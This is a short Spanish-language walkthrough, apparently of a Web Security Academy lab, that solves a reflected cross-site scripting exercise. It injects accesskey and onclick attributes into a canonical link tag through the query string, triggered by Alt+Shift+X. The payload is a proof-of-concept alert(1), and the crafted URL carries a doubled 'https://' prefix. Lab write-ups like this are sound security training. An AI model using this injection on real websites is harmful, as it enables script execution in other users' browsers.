Básicamente el usuario hará Alt+Shift+X, por ello usaremos el accesskey=x 

Si vemos el código fuente de la página, en el head está:
```
<link rel="canonical" href='https://0a64000d0427095780b403f9002a0068.web-security-academy.net/'/>
```

Entonces la uri final que pondremos en el navegador será:
```
https://https://0a64000d0427095780b403f9002a0068.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

Ya que en la página se quedará así:
```
<link rel="canonical" href='https://0a64000d0427095780b403f9002a0068.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```
